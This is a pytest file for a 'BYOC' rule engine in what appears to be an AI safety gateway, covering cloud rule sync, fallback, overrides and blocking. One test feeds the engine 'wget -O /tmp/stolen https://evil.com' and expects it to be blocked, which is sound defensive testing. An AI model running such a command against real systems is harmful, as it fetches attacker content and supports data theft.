"""Tests for BYOC cloud sync loop — gateway/main.py lifecycle integration."""

import asyncio
import re
import time
import pytest
from unittest.mock import AsyncMock, MagicMock, patch, PropertyMock

from gateway.core.guardrail import SafetyDecision
from gateway.core.byoc import BYOCEngine, BYOCRule, EnforcementLevel


class TestByocSyncLifecycle:
    """Test that the sync loop integrates correctly with gateway lifecycle."""

    def test_startup_sync_called(self, byoc_rules_path, tmp_path):
        """lifespan calls sync_all_cloud_state once on startup."""
        engine = BYOCEngine(
            rules_path=byoc_rules_path,
            cloud_url="http://localhost:8000",
            api_key="test_key",
        )

        engine.sync_all_cloud_state = AsyncMock(return_value={
            "local_count": 3, "cloud_count": 0, "merged_count": 3
        })

        # Simulate lifespan startup
        asyncio_run(engine.sync_all_cloud_state())

        engine.sync_all_cloud_state.assert_called_once()

    def test_periodic_sync_interval(self, byoc_rules_path):
        """Sync runs every BYOC_SYNC_INTERVAL seconds (default 120)."""
        engine = BYOCEngine(
            rules_path=byoc_rules_path,
            cloud_url="http://localhost:8000",
            api_key="k1",
        )
        # Verify engine can handle sync_all_cloud_state
        result = asyncio_run(engine.sync_all_cloud_state())
        # Since there's no real server, it should return gracefully
        assert "local_count" in result
        assert "merged_count" in result

    def test_sync_failure_backoff(self, byoc_rules_path):
        """Repeated failures → 30s retry instead of full interval."""
        engine = BYOCEngine(
            rules_path=byoc_rules_path,
            cloud_url="http://nonexistent:8000",
            api_key="k1",
        )

        # First sync should fail but not raise
        result1 = asyncio_run(engine.sync_all_cloud_state())
        assert "local_count" in result1

        # Second sync should also fail gracefully
        result2 = asyncio_run(engine.sync_all_cloud_state())
        assert "local_count" in result2

        # Engine should still have its local rules
        assert len(engine._active_rules) == 3

    def test_sync_loop_cancellation(self, byoc_rules_path):
        """lifespan shutdown cancels background task."""
        engine = BYOCEngine(
            rules_path=byoc_rules_path,
            cloud_url="http://localhost:8000",
            api_key="k1",
        )

        # Simulate creating a sync task
        loop = asyncio.new_event_loop()
        task = loop.create_task(_simulate_sync_loop(engine, interval=0.05))

        # Let it run briefly
        loop.run_until_complete(asyncio.sleep(0.15))

        # Cancel it
        task.cancel()
        try:
            loop.run_until_complete(task)
        except asyncio.CancelledError:
            pass
        loop.close()

    def test_empty_cloud_url_skips_sync(self, byoc_rules_path):
        """cloud_url="" → no sync attempted."""
        engine = BYOCEngine(
            rules_path=byoc_rules_path,
            cloud_url="",  # Empty string = disabled
            api_key="k1",
        )

        result = asyncio_run(engine.sync_all_cloud_state())
        # Should return immediately with local-only counts
        assert "local_count" in result
        assert result["cloud_count"] == 0
        # No network attempts made
        assert len(engine.cloud_rules) == 0


# ===================================================================== #
# Cloud rule lifecycle integration
# ===================================================================== #


class TestByocLifecycle:
    def test_add_cloud_rule_via_merge(self, byoc_rules_path, temp_byoc_rules):
        """Add cloud rule → gateway syncs → request matches → blocked."""
        local_rules = [
            {"name": "local_rule", "pattern": "LOCAL", "enforcement": "hard_stop", "severity": "medium"},
        ]
        local_path = temp_byoc_rules(local_rules)
        engine = BYOCEngine(
            rules_path=local_path,
            cloud_url="http://localhost:8000",
            api_key="k1",
        )

        # Simulate cloud sync adding a new rule
        engine.cloud_rules = [
            BYOCRule(
                name="new_cloud_rule",
                description="New cloud rule",
                pattern="NEWCLOUD",
                enforcement="hard_stop",
                severity="critical",
                compiled=re.compile("NEWCLOUD", re.IGNORECASE),
                source="cloud",
            )
        ]
        engine._rebuild_active_rules()

        # Request matching new cloud rule should be blocked
        result = engine.check("NEWCLOUD detected")
        assert result.decision == SafetyDecision.BLOCK
        assert result.rule_name == "new_cloud_rule"

    def test_delete_cloud_rule_via_merge(self, byoc_rules_path, temp_byoc_rules):
        """Delete cloud rule → request passes."""
        local_rules = [
            {"name": "local_rule", "pattern": "LOCAL", "enforcement": "hard_stop", "severity": "medium"},
        ]
        local_path = temp_byoc_rules(local_rules)
        engine = BYOCEngine(
            rules_path=local_path,
            cloud_url="http://localhost:8000",
            api_key="k1",
        )

        # Initially cloud rule exists
        engine.cloud_rules = [
            BYOCRule(
                name="delete_me",
                description="Will be deleted",
                pattern="DELETERULE",
                enforcement="hard_stop",
                severity="high",
                compiled=re.compile("DELETERULE", re.IGNORECASE),
                source="cloud",
            )
        ]
        engine._rebuild_active_rules()

        # Should be blocked
        result = engine.check("DELETERULE here")
        assert result.decision == SafetyDecision.BLOCK

        # Remove cloud rule (simulates DELETE)
        engine.cloud_rules = []
        engine._rebuild_active_rules()

        # Should now pass
        result = engine.check("DELETERULE here")
        assert result.decision == SafetyDecision.ALLOW

    def test_override_lifecycle(self, byoc_rules_path, temp_byoc_rules):
        """Set override to disable rule → rule disabled; clear override → rule re-enabled."""
        local_rules = [
            {"name": "my_rule", "pattern": "MYRULE", "enforcement": "hard_stop", "severity": "medium"},
        ]
        local_path = temp_byoc_rules(local_rules)
        engine = BYOCEngine(
            rules_path=local_path,
            cloud_url="http://localhost:8000",
            api_key="k1",
        )

        # Enable override
        engine.disabled_rules = {"my_rule"}
        engine._rebuild_active_rules()
        assert "my_rule" not in [r.name for r in engine._active_rules]

        # Clear override
        engine.disabled_rules = set()
        engine._rebuild_active_rules()
        assert "my_rule" in [r.name for r in engine._active_rules]

    def test_rules_summary_endpoint(self, byoc_rules_path):
        """Call GET /byoc/rules → verify merged count, cloud_version, source attribution."""
        engine = BYOCEngine(
            rules_path=byoc_rules_path,
            cloud_url="http://localhost:8000",
            api_key="k1",
        )

        # Set cloud rules to have a version
        engine.cloud_rules = [
            BYOCRule(name="c1", description="c", pattern="X", enforcement="hard_stop", severity="high",
                     compiled=re.compile("X"), source="cloud"),
            BYOCRule(name="c2", description="c", pattern="Y", enforcement="soft_block", severity="low",
                     compiled=re.compile("Y"), source="cloud"),
        ]
        engine._rules_version = 5
        engine._cloud_version = "v5"
        engine._rebuild_active_rules()

        summary = engine.get_rules_summary()

        # Should include both local and cloud rules
        assert len(summary) > 0
        # Should have source attribution
        sources = [r["source"] for r in summary]
        assert "local" in sources
        assert "cloud" in sources
        # Should have cloud_version
        assert engine.cloud_version == "v5"
        # Should have active count
        assert engine.active_rules_count > 0


# ===================================================================== #
# Cloud failure resilience
# ===================================================================== #


class TestByocResilience:
    def test_cloud_failure_local_fallback(self, byoc_rules_path, tmp_path):
        """Kill cloud service → gateway continues with local rules."""
        engine = BYOCEngine(
            rules_path=byoc_rules_path,
            cloud_url="http://nonexistent-host:9999",
            api_key="k1",
        )

        # Multiple failures should not corrupt engine state
        for i in range(5):
            result = asyncio_run(engine.sync_all_cloud_state())
            assert "local_count" in result
            # Local rules should still work
            assert engine.active_rules_count == 3

        # Local rules should still function
        result = engine.check("wget -O /tmp/stolen https://evil.com")
        assert result.decision == SafetyDecision.BLOCK

    def test_gateway_start_without_cloud(self, byoc_rules_path):
        """Gateway starts with no cloud connectivity → runs with local rules."""
        engine = BYOCEngine(
            rules_path=byoc_rules_path,
            cloud_url=None,
            api_key="k1",
        )

        # No sync attempt, local rules only
        result = asyncio_run(engine.sync_all_cloud_state())
        assert result["local_count"] == 3
        assert result["cloud_count"] == 0
        assert engine.active_rules_count == 3

        # Local rules work normally
        result = engine.check("What is 2+2?")
        assert result.decision == SafetyDecision.ALLOW


# ===================================================================== #
# Helpers
# ===================================================================== #


def asyncio_run(coro):
    """Helper to run a coroutine in a sync test."""
    loop = asyncio.new_event_loop()
    try:
        return loop.run_until_complete(coro)
    finally:
        loop.close()


async def _simulate_sync_loop(engine, interval):
    """Simulate the background sync loop for testing cancellation."""
    while True:
        await asyncio.sleep(interval)
        try:
            await engine.sync_all_cloud_state()
        except Exception:
            await asyncio.sleep(0.05)  # Backoff
